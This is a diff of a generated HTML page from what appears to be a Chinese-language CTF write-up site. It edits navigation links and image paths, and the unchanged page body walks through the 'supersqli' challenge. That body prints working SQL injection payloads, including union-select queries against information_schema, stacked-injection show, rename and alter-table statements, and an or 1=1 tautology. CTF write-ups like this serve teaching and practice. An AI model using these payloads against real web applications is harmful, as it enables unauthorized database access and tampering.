@@ -226,8 +226,30 @@
 
       
         
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../../Utils/Utils/" class="md-tabs__link">
+          工具
+        </a>
+      
+    </li>
+  
+
       
         
+  
+  
+    <li class="md-tabs__item">
+      
+        <a href="../../../../FAQ/FAQ/" class="md-tabs__link">
+          FAQ
+        </a>
+      
+    </li>
+  
+
       
     </ul>
   </div>
@@ -341,6 +363,18 @@
   <li class="md-nav__item">
     <a href="../../../pwn/integer_overflow/int_overflow/" class="md-nav__link">
       int_overflow
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../pwn/integer_overflow/hero/" class="md-nav__link">
+      hero
     </a>
   </li>
 
@@ -682,10 +716,36 @@
       
 
 
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
+    
+    <label class="md-nav__link" for="nav-5">
+      工具
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="工具" data-md-level="1">
+      <label class="md-nav__title" for="nav-5">
+        <span class="md-nav__icon md-icon"></span>
+        工具
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
   <li class="md-nav__item">
     <a href="../../../../Utils/Utils/" class="md-nav__link">
-      工具
+      其他
     </a>
+  </li>
+
+        
+      </ul>
+    </nav>
   </li>
 
     
@@ -694,10 +754,36 @@
       
 
 
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-nav__toggle md-toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
+    
+    <label class="md-nav__link" for="nav-6">
+      FAQ
+      <span class="md-nav__icon md-icon"></span>
+    </label>
+    <nav class="md-nav" aria-label="FAQ" data-md-level="1">
+      <label class="md-nav__title" for="nav-6">
+        <span class="md-nav__icon md-icon"></span>
+        FAQ
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
   <li class="md-nav__item">
     <a href="../../../../FAQ/FAQ/" class="md-nav__link">
-      FAQ
+      使用手册
     </a>
+  </li>
+
+        
+      </ul>
+    </nav>
   </li>
 
     
@@ -753,14 +839,14 @@
                 
                 <h1 id="supersqli">supersqli</h1>
 <h2 id="_1">一、审题</h2>
-<p><img alt="" src="/13.PNG" /></p>
+<p><img alt="" src="../img/supersqli1.PNG" /></p>
 <h2 id="_2">二、解题思路</h2>
 <p>1、考点为堆叠注入，通常来说数据库每次执行一条指令，但堆叠注入是例外，在原语句后加上分号，多条语句可以一次执行，但其使用场景有限，受API、数据库引擎、权限等限制，例如利用mysqli_multi_query()函数就支持多条sql语句同时执行，但实际情况中，如PHP为了防止sql注入机制，往往使用调用数据库的函数是mysqli_  query()函数，其只能执行一条语句，分号后面的内容将不会被执行；</p>
 <p>2、观察题目，发现题目中直接给了一个注入框，默认查询为<code>inject=1</code>，首先尝试闭合条件，发现使用单引号<code>'</code>时报错；</p>
-<p><img src="/14.PNG" alt="    " style="zoom: 50%;" /></p>
-<p><img src="/15.PNG" style="zoom:50%;" /></p>
+<p><img alt="" src="../img/supersqli2.PNG" /></p>
+<p><img alt="" src="../img/supersqli3.PNG" /></p>
 <p>3、尝试使用<code>order by</code>或<code>group by</code>爆破出当前查询的列数，在尝试过程中需要将其后的单引号注释掉，首先尝试<code>--</code>注释，发现被过滤，再尝试<code>#</code>注释，可行，并爆破出当前查询列数为2，因为一直到3的时候报错了；</p>
-<p><img src="/16.PNG" style="zoom:50%;" /></p>
+<p><img alt="" src="../img/supersqli4.PNG" /></p>
 <p>4、尝试使用<code>union select</code>爆破数据库信息，但是发现有waf；</p>
 <pre><code>-- 查询库名
 ' union select 1,group_concat(schema_name) from information_schema.schemata#
@@ -776,7 +862,7 @@
 -- 查询列内容
 ' union select 1,group_concat(列名) from 列名#
 </code></pre>
-<p><img src="/17.PNG" style="zoom:50%;" /></p>
+<p><img alt="" src="../img/supersqli5.PNG" /></p>
 <p>5、注意到select关键字被过滤后，可以考虑绕过或者尝试堆叠注入，此处为堆叠注入；</p>
 <p>6、使用show命令查看库名、表名、列名；</p>
 <pre><code class="language-s">1';show databases;# -- 查看库名的命令
@@ -798,9 +884,7 @@
 1';rename tables `words` to `word`;rename tables `1919810931114514` to `words`;alter table `words` add `id` int(10);#
 </code></pre>
 <p>8、此时再使用<code>1' or 1=1#</code>，进行为真查询就能够返回最终结果，这里解释一下为什么需要这样做，有了这个相当于where条件一定为真，相当于没有where子句，等价于直接执行select * from table；</p>
-<p><img src="/18.PNG" style="zoom:50%;" /></p>
-                
-                  
+<p><img alt="" src="../img/supersqli6.PNG" /></p>
                 
               
               
@@ -819,7 +903,7 @@
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
         
-          <a href="../../../pwn/integer_overflow/int_overflow/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+          <a href="../../../pwn/integer_overflow/hero/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
             <div class="md-footer-nav__button md-icon">
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
             </div>
@@ -828,7 +912,7 @@
                 <span class="md-footer-nav__direction">
                   上一页
                 </span>
-                int_overflow
+                hero
               </div>
             </div>
           </a>
